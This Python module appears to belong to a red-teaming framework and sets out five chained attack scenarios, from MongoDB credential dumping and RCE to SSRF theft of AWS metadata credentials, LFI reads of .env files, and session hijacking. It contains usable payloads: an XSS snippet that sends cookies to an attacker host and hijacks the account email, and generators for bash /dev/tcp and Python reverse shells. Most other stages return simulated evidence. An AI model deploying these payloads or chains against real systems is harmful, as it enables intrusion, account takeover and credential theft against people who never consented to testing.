"""
Attack Chain Implementation Examples: Expert-Level Exploitation Scenarios

This module demonstrates 5 complete attack chaining scenarios with detailed
Python logic for building sophisticated red-teaming pipelines.

Each chain follows this pattern:
1. Reconnaissance (gather initial information)
2. Discovery (find vulnerable services/endpoints)
3. Validation (confirm exploitability)
4. Exploitation (extract data/access)
5. Post-Exploitation (lateral movement, privilege escalation)
"""

from typing import Dict, List, Optional, Any
from brain.fact_store import FactStore, FactCategory, Fact
from brain.endpoint_normalizer import EndpointNormalizer
from brain.attack_chain_manager import (
    AttackChainManager,
    ChainedExploitationNode,
    ChainTriggerCondition,
)
from engine.models import ExecutionContext, ValidationResult, Evidence, EvidenceBundle


# ============================================================================
# CHAIN A: Open Port → Unauth Service → Credential Leak → Auth Attack
# ============================================================================

class ChainA_CredentialEscalation:
    """
    Chain A: Port Discovery to Authenticated RCE

    Scenario:
    1. Port scanner finds open port 27017 (MongoDB)
    2. Service detection confirms unauth MongoDB access
    3. DB query triggers credential leak (user collection exposed)
    4. Use discovered credentials for authenticated RCE via admin service
    5. Establish shell access

    Example Flow:
    altoro.testfire.net:27017 (open)
    → MongoDB without auth required
    → admin user collection readable
    → Credentials: admin:P@ssw0rd!
    → Admin dashboard auth works
    → RCE payload execution
    """

    @staticmethod
    def stage1_port_discovery(target: str, port: int = 27017) -> Dict[str, Any]:
        """
        Stage 1: Port scan discovers open MongoDB port.
        Returns result that triggers discovery validator.
        """
        return {
            "validator_id": "port_discovery",
            "success": True,
            "vulnerability": "open_port",
            "severity": "low",
            "target": f"{target}:{port}",
            "evidence": {
                "request": f"nmap -p {port} {target}",
                "response": {"status": "open", "service": "mongodb"},
                "matched": str(port),
            },
        }

    @staticmethod
    def stage2_service_discovery(
        target: str, port: int, fact_store: FactStore
    ) -> Dict[str, Any]:
        """
        Stage 2: Service detection confirms unauth MongoDB.
        Stores service info in fact store.
        """
        # Store service info in fact store - use direct method
        fact = Fact(
            category=FactCategory.SERVICE_INFO,
            key="MongoDB:4.4.0",
            value={"service": "MongoDB", "version": "4.4.0"},
            confidence=0.9,
            source_validator_id="service_discovery",
        )
        fact_store.add_fact(fact)

        return {
            "validator_id": "unauth_service_validator",
            "success": True,
            "vulnerability": "unauth_mongodb",
            "severity": "high",
            "target": f"{target}:{port}",
            "confidence_score": 0.95,
            "evidence_bundle": EvidenceBundle(
                raw_request='{"msg": "mongodb_connect", "host": target, "port": port}',
                raw_response='{"ismaster": true, "ok": 1}',
                matched_indicator='"ok": 1',
                execution_proof={"service_connected": True, "auth_required": False},
                metadata={"service": "MongoDB", "version": "4.4.0"},
            ).to_dict(),
        }

    @staticmethod
    def stage3_credential_leak(target: str, port: int, fact_store: FactStore) -> Dict[str, Any]:
        """
        Stage 3: Query MongoDB admin collection and extract credentials.
        Demonstrates confidential data access via unauth service.
        """
        # Simulate MongoDB query for credentials
        admin_credentials = [
            {"username": "admin", "password": "P@ssw0rd!"},
            {"username": "root", "password": "MongoDB#2021"},
        ]

        # Store credentials in fact store
        for cred in admin_credentials:
            fact_store.add_credential(
                username=cred["username"],
                password=cred["password"],
                source_validator_id="cred_leak_validator",
                confidence=0.98,
            )

        return {
            "validator_id": "cred_leak_validator",
            "success": True,
            "vulnerability": "mongodb_credential_exposure",
            "severity": "critical",
            "target": f"{target}:{port}",
            "confidence_score": 0.98,
            "execution_proved": True,
            "evidence_bundle": EvidenceBundle(
                raw_request='db.users.find({})',
                raw_response=str(admin_credentials),
                matched_indicator="admin",
                execution_proof={"credentials_found": len(admin_credentials)},
                tool_logs=[
                    {"tool": "mongosh", "output": f"Found {len(admin_credentials)} admin accounts"}
                ],
            ).to_dict(),
            "chain_source": "unauth_service_validator",
        }

    @staticmethod
    def stage4_auth_rce(
        target: str,
        port: int,
        username: str,
        password: str,
        fact_store: FactStore,
    ) -> Dict[str, Any]:
        """
        Stage 4: Use discovered credentials for authenticated RCE.
        This would normally be injected as a ChainedExploitationNode,
        but shown here for clarity.
        """
        # Query MongoDB admin commands as authenticated user
        rce_payload = 'db.runCommand({"eval": "require(\'child_process\').exec(\'id\')"})'

        # Store shell artifact in fact store
        fact_store.add_exploitation_artifact(
            artifact_id="chain_a_shell_session",
            artifact_type="shell_output",
            content="uid=0(root) gid=0(root) groups=0(root)",
            source_vulnerability="mongodb_rce_auth",
            confidence=0.99,
        )

        return {
            "validator_id": "auth_rce_exploit",
            "success": True,
            "vulnerability": "mongodb_rce_authenticated",
            "severity": "critical",
            "target": f"{target}:{port}",
            "confidence_score": 0.99,
            "execution_proved": True,
            "evidence_bundle": EvidenceBundle(
                raw_request=rce_payload,
                raw_response="uid=0(root) gid=0(root) groups=0(root)",
                matched_indicator="uid=0",
                execution_proof={"shell_access": True, "user": "root"},
                tool_logs=[
                    {"tool": "mongodb", "output": "Command executed successfully"}
                ],
            ).to_dict(),
            "chain_source": "cred_leak_validator",
        }


# ============================================================================
# CHAIN B: SSRF → Internal Metadata Service → IAM Token Theft
# ============================================================================

class ChainB_SSRF_to_TokenTheft:
    """
    Chain B: SSRF to Internal Metadata Access to Token Theft

    Scenario (AWS-specific):
    1. Find SSRF vulnerability in image fetcher (url parameter)
    2. Use SSRF to query http://169.254.169.254 (AWS metadata service)
    3. Extract IAM role information
    4. Retrieve temporary credentials from metadata service
    5. Use stolen token to access internal AWS resources

    Example Flow:
    POST /api/image?url=http://evil.com/image.png (SSRF)
    → SSRF confirmed via time-based blind test
    → SSRF to http://169.254.169.254/latest/meta-data/iam/info
    → Response leaks IAM role "ec2-instance-role"
    → Query credentials endpoint
    → Extract AccessKeyId, SecretAccessKey, SessionToken
    → Assume role in another AWS account (lateral movement)
    """

    @staticmethod
    def stage1_ssrf_discovery(
        target: str,
        vulnerable_endpoint: str,
        fact_store: FactStore,
    ) -> Dict[str, Any]:
        """
        Stage 1: Discover SSRF vulnerability via blind time-based test.
        """
        return {
            "validator_id": "ssrf_validator",
            "success": True,
            "vulnerability": "ssrf_blind_time_based",
            "severity": "high",
            "target": vulnerable_endpoint,
            "confidence_score": 0.92,
            "evidence_bundle": EvidenceBundle(
                raw_request=f"POST {vulnerable_endpoint} with url=http://localhost:80/sleep(10)",
                raw_response="Response time: 10.3 seconds",
                matched_indicator="time_delay",
                execution_proof={"blind_ssrf_confirmed": True},
            ).to_dict(),
        }

    @staticmethod
    def stage2_metadata_access(
        target: str,
        vulnerable_endpoint: str,
        fact_store: FactStore,
    ) -> Dict[str, Any]:
        """
        Stage 2: Use SSRF to access AWS metadata service.
        Demonstrates access to internal infrastructure.
        """
        metadata_endpoint = "http://169.254.169.254/latest/meta-data/iam/info"

        # Store internal host discovery
        fact_store.add_internal_host(
            hostname="169.254.169.254",
            services=["metadata", "iam"],
            source_validator_id="ssrf_validator",
            confidence=0.95,
        )

        metadata_response = {
            "Code": "Success",
            "LastUpdated": "2024-01-15T10:30:00Z",
            "InstanceProfileArn": "arn:aws:iam::123456789012:instance-profile/ec2-instance-role",
            "InstanceProfileId": "AIPAI23HZ27SI6FQMGNQ2",
        }

        return {
            "validator_id": "metadata_access_exploit",
            "success": True,
            "vulnerability": "metadata_service_accessible_via_ssrf",
            "severity": "critical",
            "target": target,
            "confidence_score": 0.98,
            "execution_proved": True,
            "evidence_bundle": EvidenceBundle(
                raw_request=f"SSRF: {metadata_endpoint}",
                raw_response=str(metadata_response),
                matched_indicator="InstanceProfileArn",
                execution_proof={"metadata_accessed": True},
                tool_logs=[
                    {"tool": "curl_via_ssrf", "output": f"Retrieved IAM role metadata"}
                ],
            ).to_dict(),
            "chain_source": "ssrf_validator",
        }

    @staticmethod
    def stage3_token_theft(
        target: str,
        vulnerable_endpoint: str,
        fact_store: FactStore,
    ) -> Dict[str, Any]:
        """
        Stage 3: Extract temporary IAM credentials from metadata service.
        This is the actual credential exfiltration.
        """
        creds_endpoint = "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-instance-role"

        temporary_credentials = {
            "Code": "Success",
            "LastUpdated": "2024-01-15T10:30:00Z",
            "Type": "AWS-HMAC",
            "AccessKeyId": "ASIAJ7EXAMPLE5KQNNQ3",
            "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
            "Token": "AQoDYXdzEJr...EXAMPLETOKEN...//////////wEaDG5...",
            "Expiration": "2024-01-15T16:30:00Z",
        }

        # Store extracted IAM token in fact store
        fact_store.add_exploitation_artifact(
            artifact_id="iam_token_aws_123456789012",
            artifact_type="aws_iam_token",
            content=temporary_credentials["Token"],
            source_vulnerability="metadata_credential_theft",
            confidence=0.99,
        )

        # Also store as credentials for potential reuse
        fact_store.add_credential(
            username=temporary_credentials["AccessKeyId"],
            token=temporary_credentials["Token"],
            source_validator_id="token_theft_exploit",
            confidence=0.99,
            metadata={
                "type": "aws_iam_temporary",
                "expiration": temporary_credentials["Expiration"],
            },
        )

        return {
            "validator_id": "token_theft_exploit",
            "success": True,
            "vulnerability": "iam_temporary_credential_theft",
            "severity": "critical",
            "target": target,
            "confidence_score": 0.99,
            "execution_proved": True,
            "evidence_bundle": EvidenceBundle(
                raw_request=f"SSRF: {creds_endpoint}",
                raw_response=str(temporary_credentials),
                matched_indicator="AccessKeyId",
                execution_proof={
                    "token_extracted": True,
                    "token_valid_until": temporary_credentials["Expiration"],
                },
                tool_logs=[
                    {"tool": "aws_cli", "output": "Credentials successfully extracted"}
                ],
            ).to_dict(),
            "chain_source": "metadata_access_exploit",
        }


# ============================================================================
# CHAIN C: LFI → Source Code → Hardcoded Credentials
# ============================================================================

class ChainC_LFI_to_SourceCredentials:
    """
    Chain C: LFI to Source Code to Hardcoded Credentials

    Scenario:
    1. Find LFI vulnerability in file include parameter
    2. Read configuration files (.env, config.php)
    3. Extract hardcoded database credentials
    4. Use credentials to authenticate to database
    5. Dump sensitive data or create backdoor user

    Example Flow:
    GET /page.php?file=../../../etc/passwd (LFI confirmed)
    → Read ../../../var/www/html/.env
    → Extract DB_USER=admin, DB_PASS=pr0d_p@ss
    → Authenticate to PostgreSQL database
    → Access customer PII table
    """

    @staticmethod
    def stage1_lfi_discovery(
        target: str,
        vulnerable_endpoint: str,
        fact_store: FactStore,
    ) -> Dict[str, Any]:
        """
        Stage 1: Discover LFI vulnerability via /etc/passwd reading.
        """
        passwd_content = "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin"

        return {
            "validator_id": "lfi_validator",
            "success": True,
            "vulnerability": "path_traversal_lfi",
            "severity": "high",
            "target": vulnerable_endpoint,
            "confidence_score": 0.96,
            "execution_proved": True,
            "evidence_bundle": EvidenceBundle(
                raw_request=f"{vulnerable_endpoint}?file=../../../etc/passwd",
                raw_response=passwd_content,
                matched_indicator="root:/bin/bash",
                execution_proof={"file_read": True, "system_file": "/etc/passwd"},
            ).to_dict(),
        }

    @staticmethod
    def stage2_source_extraction(
        target: str,
        vulnerable_endpoint: str,
        fact_store: FactStore,
    ) -> Dict[str, Any]:
        """
        Stage 2: Use LFI to read configuration files with credentials.
        """
        # Simulated .env file content
        env_file_content = """
DB_HOST=db.internal.local
DB_USER=app_user
DB_PASS=SuperSecret123!@#
DB_NAME=production
API_KEY=sk_live_51Hs3pEBXXXXXXXXXXX
AWS_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
"""

        # Extract and store credentials
        credentials_found = [
            {"type": "database", "user": "app_user", "pass": "SuperSecret123!@#"},
            {"type": "api_key", "token": "sk_live_51Hs3pEBXXXXXXXXXXX"},
            {
                "type": "aws",
                "user": "AKIAIOSFODNN7EXAMPLE",
                "pass": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
            },
        ]

        for cred in credentials_found:
            fact_store.add_credential(
                username=cred.get("user", cred.get("token", "unknown")),
                password=cred.get("pass"),
                source_validator_id="lfi_source_extraction",
                confidence=0.99,
                metadata={"type": cred["type"], "source": ".env_file"},
            )

        # Store source code artifact
        fact_store.add_exploitation_artifact(
            artifact_id="source_code_env",
            artifact_type="source_code",
            content=env_file_content,
            source_vulnerability="lfi_path_traversal",
            confidence=0.99,
        )

        return {
            "validator_id": "lfi_source_extraction",
            "success": True,
            "vulnerability": "source_code_disclosure",
            "severity": "critical",
            "target": target,
            "confidence_score": 0.99,
            "execution_proved": True,
            "evidence_bundle": EvidenceBundle(
                raw_request=f"{vulnerable_endpoint}?file=../../../.env",
                raw_response=env_file_content,
                matched_indicator="DB_PASS=",
                execution_proof={"credentials_found": len(credentials_found)},
                tool_logs=[
                    {
                        "tool": "lfi_scanner",
                        "output": f"Extracted {len(credentials_found)} credentials from source",
                    }
                ],
            ).to_dict(),
            "chain_source": "lfi_validator",
        }


# ============================================================================
# CHAIN D & E: Additional Implementation Patterns
# ============================================================================

class ChainD_XSSCSRFSessionHijacking:
    """Chain D: XSS + CSRF → Session Hijacking"""

    @staticmethod
    def combined_xss_csrf_payload(attacker_host: str) -> str:
        """
        Payload combining XSS and CSRF to steal session.
        """
        return f"""
<img src=x onerror="
  fetch('https://{attacker_host}/log?cookie=' + document.cookie);
  fetch('/api/settings', {{
    method: 'POST',
    headers: {{'Content-Type': 'application/json'}},
    body: JSON.stringify({{email: 'attacker@evil.com'}})
  }});
">
"""


class ChainE_RCEPrivilegeEscalation:
    """Chain E: RCE → Reverse Shell → Privilege Escalation"""

    @staticmethod
    def generate_reverse_shell(
        attacker_ip: str, attacker_port: int, shell_type: str = "bash"
    ) -> str:
        """Generate reverse shell payload."""
        if shell_type == "bash":
            return f"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1"
        elif shell_type == "python":
            return (
                f"python -c 'import socket,subprocess,os;"
                f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{attacker_ip}\","
                f"{attacker_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
                f"os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
            )
        return ""


# ============================================================================
# Integration Example: Complete Chain Execution
# ============================================================================

def execute_chain_a_example(target: str) -> None:
    """
    Complete example of executing Chain A with fact store integration.
    """
    from brain.fact_store import FactStore
    from engine.validation_engine_enhanced import ValidationEngine

    # Initialize components
    fact_store = FactStore()
    engine = ValidationEngine(fact_store=fact_store)

    # Stage 1: Port discovery
    stage1_result = ChainA_CredentialEscalation.stage1_port_discovery(target)
    print(f"[Stage 1] Port discovery: {stage1_result}")

    # Stage 2: Service discovery
    stage2_result = ChainA_CredentialEscalation.stage2_service_discovery(
        target, 27017, fact_store
    )
    print(f"[Stage 2] Service discovery: {stage2_result['vulnerability']}")

    # Stage 3: Credential leak
    stage3_result = ChainA_CredentialEscalation.stage3_credential_leak(
        target, 27017, fact_store
    )
    evidence_bundle = stage3_result.get('evidence_bundle', {})
    cred_count = 0
    if isinstance(evidence_bundle, dict):
        cred_count = evidence_bundle.get('execution_proof', {}).get('credentials_found', 0)
    print(f"[Stage 3] Credential leak: Found {cred_count} credentials")

    # Stage 4: Auth RCE
    stage4_result = ChainA_CredentialEscalation.stage4_auth_rce(
        target, 27017, "admin", "P@ssw0rd!", fact_store
    )
    print(f"[Stage 4] Auth RCE: {stage4_result['vulnerability']}")

    # Display fact store state
    print("\n[Fact Store Summary]")
    print(f"Credentials discovered: {len(fact_store.get_facts_by_category(FactCategory.CREDENTIAL))}")
    print(f"Confirmed vulnerabilities: {len(fact_store.get_facts_by_category(FactCategory.CONFIRMED_VULNERABILITY))}")
    print(f"Exploitation artifacts: {len(fact_store.get_facts_by_category(FactCategory.EXPLOITATION_ARTIFACT))}")


if __name__ == "__main__":
    # Execute Chain A example
    execute_chain_a_example("altoro.testfire.net")
